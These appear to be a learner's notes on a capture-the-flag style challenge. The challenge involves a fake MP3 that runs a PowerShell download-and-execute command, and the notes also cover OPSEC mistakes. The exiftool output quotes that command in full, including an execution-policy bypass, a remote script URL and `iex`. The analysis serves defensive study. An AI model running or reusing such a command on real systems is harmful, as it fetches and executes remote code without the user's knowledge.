## Maybe SOC-mas music, he thought, doesn't come from a store?

- **Malvertising**: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.
- **[[#^796888|Phishing]] scams**: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
- **Bundled malware**: Some converters may come with malware, tricking users into unknowingly running it.

To determine the file's content:

```shell
file song.mp3
song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```

To reveal the embedded commands and attributes, we can use **ExifTool**:

```shell
exiftool somg.mp3
Relative Path : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Working Directory : C:\Windows\System32\WindowsPowerShell\v1.0 Command Line Arguments : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)" Machine ID : win-base-2019
```

What this PowerShell command does:

- The `-ep Bypass -nop` flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
- The `DownloadFile` method pulls a file (in this case, `IS.ps1`) from a remote server ([https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)) and saves it in the `C:\\ProgramData\\` directory on the target machine.
- Once downloaded, the script is executed with PowerShell using the `iex` command, which triggers the downloaded `s.ps1` file.

## ## Introduction to [[#^fbeee2|OPSEC]]

In the context of cyber security, when malicious actors fail to follow proper OPSEC practices, they might leave digital traces that can be pieced together to reveal their identity. Some common OPSEC mistakes include:

- Reusing usernames, email addresses, or account handles across multiple platforms. One might assume that anyone trying to cover their tracks would remove such obvious and incriminating information, but sometimes, it's due to vanity or simply forgetfulness.
- Using identifiable metadata in code, documents, or images, which may reveal personal information like device names, GPS coordinates, or timestamps.
- Posting publicly on forums or GitHub (Like in this current scenario) with details that tie back to their real identity or reveal their location or habits.
- Failing to use a VPN or proxy while conducting malicious activities allows law enforcement to track their real IP address.

## Glossary

- Operational Security (OPSEC) is a set of principals and tactics used to attempt to protect the security of an operator or operation. An example of this may be using code names instead of your real names, or using a proxy to conceal your IP address. ^fbeee2
- Phishing Scams - When emails are sent to a target(s) purporting to be from a trusted entity to lure individuals into providing sensitive information. ^796888